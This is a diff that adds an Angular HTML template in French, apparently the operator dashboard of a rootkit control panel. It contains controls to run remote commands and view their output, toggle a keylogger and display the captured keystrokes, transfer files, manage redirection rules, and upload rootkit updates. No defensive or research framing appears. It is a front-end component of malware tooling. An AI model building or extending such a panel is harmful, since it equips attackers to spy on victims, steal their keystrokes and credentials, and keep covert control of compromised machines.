@@ -1,0 +1,59 @@
+<div class="dashboard">
+  <div class="command-section">
+    <h2>Exécuter une commande</h2>
+    <div class="command-input">
+      <input type="text" [(ngModel)]="command" placeholder="Entrez une commande...">
+      <button (click)="executeCommand()">Exécuter</button>
+    </div>
+    <div class="command-output" *ngIf="commandOutput">
+      <pre>{{ commandOutput }}</pre>
+    </div>
+  </div>
+
+  <div class="keylogger-section">
+    <h2>Keylogger</h2>
+    <button (click)="toggleKeylogger()">
+      {{ isKeyloggerRunning ? 'Arrêter' : 'Démarrer' }} le keylogger
+    </button>
+    <div class="keylog-output" *ngIf="keylogOutput">
+      <pre>{{ keylogOutput }}</pre>
+    </div>
+  </div>
+
+  <div class="files-section">
+    <h2>Gestion des fichiers</h2>
+    <div class="file-upload">
+      <input type="file" (change)="onFileSelected($event)">
+      <button (click)="uploadFile()" [disabled]="!selectedFile">Télécharger</button>
+    </div>
+    <div class="file-list">
+      <h3>Fichiers disponibles</h3>
+      <ul>
+        <li *ngFor="let file of files">
+          {{ file }}
+          <button (click)="downloadFile(file)">Télécharger</button>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="redirect-section">
+    <h2>Règles de redirection</h2>
+    <div class="redirect-rules">
+      <ul>
+        <li *ngFor="let rule of redirectRules">
+          {{ rule.source }} -> {{ rule.destination }}
+          <button (click)="removeRedirectRule(rule.source)">Supprimer</button>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="update-section">
+    <h2>Mise à jour du rootkit</h2>
+    <div class="update-upload">
+      <input type="file" (change)="onFileSelected($event)">
+      <button (click)="updateRootkit()" [disabled]="!selectedFile">Mettre à jour</button>
+    </div>
+  </div>
+</div> 
